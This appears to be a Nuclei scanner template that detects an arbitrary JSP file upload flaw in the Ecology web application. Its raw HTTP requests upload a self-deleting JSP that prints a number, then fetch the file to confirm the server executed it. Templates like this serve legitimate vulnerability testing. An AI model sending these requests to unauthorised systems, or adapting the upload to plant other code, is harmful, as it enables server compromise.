id: ecology-arbitrary-file-upload

info:
  name: Ecology Arbitrary File Upload
  author: ritikchaddha
  severity: medium
  reference:
    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  tags: ecology,upload,fileupload

requests:
  - raw:
      - |
        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed

        --b0d829daa06c13d6b3e16b0ad21d1eed\r\nContent-Disposition: form-data; name=\"file\"; filename=\"abcdefgh.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print(36453 * 87635);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--b0d829daa06c13d6b3e16b0ad21d1eed--\r\n\r\n

      - |
        GET /page/exportImport/fileTransfer/abcdefgh.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "3194558655"
        part: body

      - type: status
        status:
          - 200
        condition: and
